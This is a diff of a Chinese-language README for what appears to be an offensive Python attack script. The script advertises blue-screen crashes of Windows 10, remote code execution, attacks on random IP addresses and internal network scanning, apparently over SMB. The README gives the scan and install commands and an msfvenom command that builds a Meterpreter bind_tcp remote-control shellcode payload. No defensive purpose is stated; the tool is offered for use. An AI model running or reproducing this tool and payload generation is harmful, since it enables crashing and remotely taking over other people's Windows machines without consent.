@@ -1,4 +1,14 @@
-我给我的脚本加上了蓝屏攻击功能，可以对windows10进行蓝屏攻击
-也有扫描功能,本脚本有扫描功能，指令功能，攻击功能,本脚本需要的第三方模块只有netaddr模块,使用以下指令安装
+本脚本有蓝屏攻击， 远程代码执行功能, 随机IP攻击功能, 内网扫描
+扫描内网的指令
+./main.py local
+
+本模块需要netaddr模块
+使用指令安装
 python3 -m pip install netaddr 或者 pip install netaddr
-smbprotocol模块不需要手动下载，因为我已经下载到这里了
+
+smbprotocol模块无需手动下载
+
+生成远程控制载荷
+	msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -f python -o shellcode.txt
+
+本脚本的远程控制代码在网上参考
